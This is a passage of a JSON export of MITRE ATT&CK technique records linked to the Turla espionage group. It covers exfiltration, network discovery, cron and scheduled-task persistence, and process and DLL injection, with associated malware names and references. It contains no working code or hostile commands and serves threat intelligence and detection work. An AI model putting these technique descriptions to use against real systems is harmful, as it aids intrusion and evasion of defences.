        "source_name": "MSDN WMI",
        "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx",
        "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
    "platform": "linux|macos|windows",
    "tid": "T1048.003",
    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "tactic": "exfiltration",
    "datasources": "command-execution|file-access|network-connection-creation|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475",
    "platform": "windows|iaas|linux|macos|network",
    "tid": "T1049",
    "technique": "System Network Connections Discovery",
    "tactic": "discovery",
    "datasources": "command-execution|os-api-execution|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|epic",
    "correlation_tool": "empire|nbtstat|net|netstat",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used.(Citation: US-CERT-TA18-106A)",
    "technique_references": [
      {
        "source_name": "Amazon AWS VPC Guide",
        "url": "https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html",
        "description": "Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Azure Virtual Network Overview",
        "url": "https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview",
        "description": "Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18). What is Azure Virtual Network?. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Google VPC Overview",
        "url": "https://cloud.google.com/vpc/docs/vpc",
        "description": "Google. (2019, September 23). Virtual Private Cloud (VPC) network overview. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "execution",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ",
    "technique_references": [
      {
        "source_name": "20 macOS Common Tools and Techniques",
        "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
        "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "persistence",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ",
    "technique_references": [
      {
        "source_name": "20 macOS Common Tools and Techniques",
        "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
        "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "penquin",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ",
    "technique_references": [
      {
        "source_name": "20 macOS Common Tools and Techniques",
        "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
        "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "execution",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|crutch|gazer",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)",
    "technique_references": [
      {
        "source_name": "ProofPoint Serpent",
        "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain",
        "description": "Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain. Retrieved April 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "persistence",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|crutch|gazer",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)",
    "technique_references": [
      {
        "source_name": "ProofPoint Serpent",
        "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain",
        "description": "Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain. Retrieved April 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "privilege-escalation",
    "datasources": "command-execution|file-modification|process-creation|scheduled-job-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|crutch|gazer",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)",
    "technique_references": [
      {
        "source_name": "ProofPoint Serpent",
        "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain",
        "description": "Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain. Retrieved April 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
    "platform": "linux|macos|windows",
    "tid": "T1055",
    "technique": "Process Injection",
    "tactic": "defense-evasion",
    "datasources": "file-metadata|file-modification|module-load|os-api-execution|process-access|process-modification",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1055.001",
      "T1055.002",
      "T1055.003",
      "T1055.004",
      "T1055.005",
      "T1055.008",
      "T1055.009",
      "T1055.011",
      "T1055.012",
      "T1055.013",
      "T1055.014",
      "T1055.015"
    ],
    "count_subtechniques": 12,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
    "platform": "linux|macos|windows",
    "tid": "T1055",
    "technique": "Process Injection",
    "tactic": "privilege-escalation",
    "datasources": "file-metadata|file-modification|module-load|os-api-execution|process-access|process-modification",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1055.001",
      "T1055.002",
      "T1055.003",
      "T1055.004",
      "T1055.005",
      "T1055.008",
      "T1055.009",
      "T1055.011",
      "T1055.012",
      "T1055.013",
      "T1055.014",
      "T1055.015"
    ],
    "count_subtechniques": 12,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "empire|ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/640.html",
        "description": "none",
        "external_id": "CAPEC-640"
      },
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sysmon v6 May 2017",
        "url": "https://docs.microsoft.com/sysinternals/downloads/sysmon",
        "description": "Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "defense-evasion",
    "datasources": "module-load|os-api-execution|process-access|process-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|kazuar",
    "correlation_tool": "ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
    "platform": "windows",
    "tid": "T1055.001",
    "technique": "Dynamic-link Library Injection",
    "tactic": "privilege-escalation",
    "datasources": "module-load|os-api-execution|process-access|process-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|kazuar",
    "correlation_tool": "ironnetinjector",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "technique_references": [
      {
        "source_name": "Elastic Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Elastic HuntingNMemory June 2017",
        "url": "https://www.endgame.com/blog/technical-blog/hunting-memory",
        "description": "Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
    "platform": "windows",
    "tid": "T1055.003",
    "technique": "Thread Execution Hijacking",
    "tactic": "defense-evasion",
    "datasources": "os-api-execution|process-access|process-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
